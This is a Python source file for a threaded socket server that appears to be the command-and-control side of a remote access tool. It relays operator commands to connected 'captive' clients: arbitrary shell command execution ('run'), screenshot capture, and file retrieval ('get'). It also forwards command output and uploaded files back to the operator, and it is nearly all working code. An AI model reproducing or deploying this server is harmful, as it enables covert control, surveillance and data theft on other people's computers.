import threading
import socket
import os


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("localhost", 5000))

clients = {}

def opDefiner(data):
    op = data.split()[1].strip()
    opSocket = clients.get(op)
    return op, opSocket


def file_sender(client, filename):
    try:
        file_size = os.path.getsize(filename)
        basename = os.path.basename(filename)

        header = f"FILE_TRANSFER {basename} {file_size}\n"
        client.sendall(header.encode("UTF-8"))

        with open(filename, "rb") as f:
            while True:
                chunk = f.read(4096)

                if not chunk:
                    break

                client.sendall(chunk)

    except FileNotFoundError:
        client.sendall(b"FILE_ERROR File not found\n")
    finally:
        os.remove(filename)

def client_listener(client, username):
    buffer = b""
    while True:
        data = client.recv(4096)
        print("DATA: ", data)

        if not data:
            break

        elif data == b"exit\n":
            del clients[username]
            client.close()
            break
            
        buffer += data        

        while buffer != b"":
            nameSection = b"> " in buffer[0:30]
            if nameSection == False:
                if buffer.startswith(b"FILE_TRANSFER"):
                    try:
                        filename = buffer.split(b" ")[1].decode("UTF-8", errors="ignore")
                        vip = clients.get(buffer.split(b" ")[3].decode())
                        file_size = int(buffer.split(b" ")[4])

                        if vip is None:
                            raise ValueError("Target client not found")

                        if not filename or not file_size:
                            vip.sendall("WRONG ARGUMENTS FOR FILE_TRANSFER".encode("UTF-8"))
                            continue

                        vip.sendall("SENDING_FORBIDDEN".encode("UTF-8"))

                        end = buffer.find(b"HEADER-END\n")
                        if end == -1:
                            data = client.recv(4096)
                            buffer += data
                            continue

                        with open(filename, "wb") as f:

                            header = buffer[:end + len(b"HEADER-END\n")]
                            buffer = buffer[end + len(b"HEADER-END\n"):]

                            if buffer: 
                                f.write(buffer)

                            rest_of_file = file_size - len(buffer)

                            while rest_of_file >= 4096:
                                data = client.recv(4096)
                                f.write(data)
                                rest_of_file -= len(data)
                            if rest_of_file > 0:
                                data = client.recv(rest_of_file)
                                f.write(data)

                        file_sender(vip, os.path.join(os.getcwd(), filename))

                        vip.sendall("SENDING ALLOWED".encode("UTF-8"))
                    except Exception as e:
                        print(e)
                        continue

                    buffer = b""
                    continue

                elif buffer.startswith(b"CMD_OUTPUT "):
                    ankor = b"CMD_OUTPUT_END\n"

                    while ankor not in buffer:
                        chunk = client.recv(1024)
                        if not chunk:
                            raise ConnectionError("Client disconnected during CMD_OUTPUT")
                        buffer += chunk
                    vip, vipSocket = opDefiner(buffer.decode("UTF-8", errors="ignore"))

                    cmd_buffer = buffer[:buffer.find(ankor)+len(ankor)]
                    buffer = buffer[buffer.find(ankor)+len(ankor):]
                    vipSocket.sendall(cmd_buffer)
                    continue

            if not b"\n" in buffer:
                continue

            msg = buffer
            buffer = buffer[buffer.find(b"> ")+2:]

            if buffer.startswith(b"screenshotFrom"):

                cmd = buffer.split(b"\n", 2)[0].decode()
                try:
                    captiveName, captive = opDefiner(cmd)
            
                    if captive is None:
                        client.sendall(
                            "No Captive Found\n".encode("UTF-8")
                        )
                        continue
    
                    captive.sendall(
                        f"{username} -screenshot".encode("UTF-8")
                    )

                    continue
    
                except Exception as e:
                    print(f"Screenshot error: {type(e).__name__}: {e}")
                    continue
                finally:
                    buffer = buffer.split(b"\n", 2)[1]

            elif buffer.startswith(b"run"):
                try:
                    cmd = buffer.split(b"\n", 2)[0].decode("UTF-8", errors="ignore").strip()
                    captiveName, captive = opDefiner(cmd)
                    commandEx = cmd.split(" ", 2)[2].strip()

                    if not captive:
                        raise ValueError("Client not found")
                    
                    if  captive == "" or commandEx == "":
                        client.send(f"No command provided to run.\n".encode("UTF-8"))
                        continue                

                    if captive:
                        try:
                            captive.send(f"{username} -run {commandEx}\n".encode("UTF-8"))
                            buffer = buffer.split(b"\n", 2)[1]
                            continue
                        except Exception as e:
                            print(f"Failed to send command to opoponent: {e}")
                            buffer = buffer.split(b"\n", 2)[1]
                    else:
                        print(f"Client not found.")
                        client.send(f"Client {captiveName} not found.\n".encode("UTF-8"))
                        buffer = buffer.split(b"\n", 2)[1]
                except Exception as e:
                    client.send(f"Client not found.\n".encode("UTF-8"))
                    buffer = buffer.split(b"\n", 2)[1]
                    print(e)
    
            elif buffer.startswith(b"get"):
                try:
                    cmd = buffer.split(b"\n", 2)[0].decode().strip() 
                    filename = cmd.split(" ")[3]
                    captiveName, captive = opDefiner(cmd)
                except Exception as e:
                    print(e)
                    client.send("Please follow special command format!".encode("UTF-8"))
                    buffer = buffer.split(b"\n", 2)[1]
                    continue

                if filename == "":
                    print("No filename provided to get.")
                    client.send(f"No filename provided to get.\n".encode("UTF-8"))
                    buffer = buffer.split(b"\n", 2)[1]
                    continue
    
                if captive:
                    try:
                        captive.send(f"{username} -get {filename}".encode("UTF-8"))
                        buffer = buffer.split(b"\n", 2)[1]
                        continue
                    except Exception as e:
                        print(f"Failed to send get request to {captiveName}: {e}")
                        buffer = buffer.split(b"\n", 2)[1]
                    continue
            else:
                cmd = msg.split(b"\n", 2)[0]
                for connected_client in clients.values():
                    connected_client.sendall(cmd)
                buffer = buffer.split(b"\n", 2)[1]
                

s.listen(5)

while True:
    client, addr = s.accept()
    username = client.recv(1024).decode("UTF-8", errors="ignore")  # Receive initial data from the client (e.g., username)
    if username in clients:
        client.send("Username already taken. Disconnecting.\n".encode("UTF-8"))
        client.close()
        continue

    clients[username] = client

    print(f"Connection from {addr} has been established!")

    listener = threading.Thread(
        target=client_listener,
        args=(client, username),
        daemon=True
    )

    listener.start()

